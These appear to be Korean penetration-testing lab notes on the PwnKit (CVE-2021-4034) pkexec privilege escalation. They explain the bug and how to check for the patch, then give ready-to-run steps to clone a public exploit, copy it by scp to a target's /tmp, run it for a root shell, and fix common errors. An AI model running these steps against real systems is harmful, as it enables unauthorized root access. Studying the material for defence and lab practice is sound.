## PwnKit (CVE-2021-4034) — pkexec

**개념**

pkexec는 PolicyKit(polkit)의 구성 요소로 일반 사용자가 특정 명령어를 다른 사용자 권한으로 실행할 수 있게 해주는 바이너리다 sudo와 비슷한 역할을 한다 SUID가 설정돼있어서 실행 시 root 권한으로 동작한다

CVE-2021-4034(PwnKit)는 pkexec의 argv(명령줄 인자) 메모리 처리 방식의 버그를 이용한 로컬 권한 상승 취약점이다 2021년에 발견됐지만 pkexec가 처음 만들어진 2009년부터 존재했던 버그라 영향을 받는 시스템이 매우 많다

**사용 조건**

로컬 계정 쉘이 있어야 한다 pkexec가 설치돼있어야 한다 polkit 버전이 0.120 이하여야 한다 exploit을 실행할 때 반드시 /tmp에서 실행해야 한다 타겟 아키텍처에 맞는 바이너리를 전송해야 한다

---

**취약점 원리**

```
# pkexec가 argv(명령줄 인자)를 처리할 때
# argv[0]이 비어있는 경우 범위를 벗어난 메모리를 읽고 쓴다
# 이를 이용해 환경변수를 조작하면
# 임의의 코드를 root 권한으로 실행할 수 있다
```

---

**영향받는 버전**

```bash
pkexec --version
# polkit 0.120 이하 전부 취약하다

# 보안 패치 확인 명령어 
zgrep -i CVE-2021-4034 /usr/share/doc/policykit-1/changelog.Debian.gz
```

---

**공격 흐름**

1. SUID 열거로 pkexec를 발견한다
2. pkexec 버전을 확인한다
3. 타겟 아키텍처를 확인한다
4. 맞는 버전의 exploit을 전송한다
5. /tmp에서 실행해서 root 쉘을 획득한다

---

**명령어**

```bash
# 칼리에서 exploit 클론
git clone https://github.com/ly4k/PwnKit
cd PwnKit
ls
# PwnKit    → 64비트 바이너리
# PwnKit32  → 32비트 바이너리
# PwnKit.c  → 소스코드
```

```bash
# 타겟 아키텍처 확인 (쉘 획득 후)
uname -m
# x86_64 → 64비트
# i686   → 32비트
file /usr/bin/pkexec
# ELF 64-bit → 64비트
# ELF 32-bit → 32비트
```

```bash
# 64비트 타겟이면
scp PwnKit MFrei@192.168.122.179:/tmp/

# 32비트 타겟이면
scp PwnKit32 MFrei@192.168.122.179:/tmp/
```

```bash
# 타겟에서 실행
# 주의: 현재 디렉토리에서 실행해야 한다
# /home 같은 곳에서 실행하면 Permission denied가 날 수 있다
# chmod +x -> 소유자 실행 권한 부여(그냥 익스플로잇 실행  습관적으로 사용하)
cd /tmp
chmod +x ./PwnKit32
./PwnKit32
```

---

**트러블슈팅**

```bash
# Exec format error가 나는 경우
# 아키텍처가 맞지 않는 것이다
# 타겟이 32비트인데 64비트 바이너리를 전송한 경우다
file /tmp/PwnKit
# 확인 후 맞는 버전으로 다시 전송한다

# Permission denied가 나는 경우
# 현재 디렉토리에서 실행하면 exploit이 임시 디렉토리를 생성하는데
# 해당 디렉토리에 쓰기 권한이 없는 것이다
# /tmp로 이동해서 실행한다
cd /tmp
./PwnKit32

# Failed to create directory가 나는 경우
# 위와 같은 이유다 /tmp로 이동해서 실행한다
cd /tmp
./PwnKit32

# 컴파일이 필요한 경우 (바이너리가 없을 때)
# 32비트 라이브러리 설치 후 컴파일한다
sudo apt install gcc-multilib -y
gcc -m32 -o PwnKit32 PwnKit.c
```

## 컴파일 방법

```bash
# 칼리에서 컴파일 후 전송
gcc exploit.c -o exploit

# 피해자에서 직접 컴파일 (gcc 있을 때)
which gcc cc g++

# 크로스 컴파일 (x86 대상)
gcc -m32 exploit.c -o exploit32

# 정적 컴파일 (라이브러리 없는 환경)
gcc -static exploit.c -o exploit_static
```
